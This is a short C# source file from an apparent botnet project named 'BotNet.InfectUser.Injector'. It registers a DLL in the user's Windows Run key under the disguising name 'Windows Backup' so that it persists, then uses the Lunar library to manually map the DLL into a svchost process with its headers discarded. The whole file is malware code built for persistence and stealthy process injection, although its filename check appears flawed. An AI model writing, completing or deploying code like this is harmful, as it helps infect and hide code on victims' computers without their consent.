using Lunar;
using Microsoft.Win32;
using System.Diagnostics;

namespace BotNet.InfectUser.Injector
{
  public class BkInjectDll
  {
    public async Task InjectSvcAsync()
    {
      var dllFilePath = Directory.GetFiles(Directory.GetCurrentDirectory()).FirstOrDefault(file => file.StartsWith("inf") && file.EndsWith(".dll"));

      if(dllFilePath != null)
      {
        RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        rk.SetValue("Windows Backup", dllFilePath);

        var process = Process.GetProcessesByName("svchost")[0];
        var procName = process.ProcessName;

        var flags = MappingFlags.DiscardHeaders;
        var mapper = new LibraryMapper(process, dllFilePath, flags);

        mapper.MapLibrary();
      }
    }
  }
}
